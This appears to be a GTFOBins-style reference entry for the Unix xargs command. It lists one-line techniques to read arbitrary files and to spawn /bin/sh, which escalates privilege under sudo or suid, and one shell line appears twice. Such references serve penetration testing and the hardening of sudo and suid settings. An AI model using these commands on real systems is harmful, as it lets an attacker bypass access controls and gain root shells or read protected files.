---
type: gtfobin
name: xargs
platform: Unix
functions: [file-read, shell]
tags: [gtfobin, unix, lotl]
---

# xargs

## file-read

```bash
xargs -a /path/to/input-file -0
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
xargs -a /dev/null /bin/sh
```
**Contexts:** sudo, suid, unprivileged

```bash
xargs -a /dev/null /bin/sh
```
**Contexts:** sudo, suid, unprivileged

```bash
echo x | xargs -o -a /dev/null /bin/sh
```
**Contexts:** sudo, suid, unprivileged
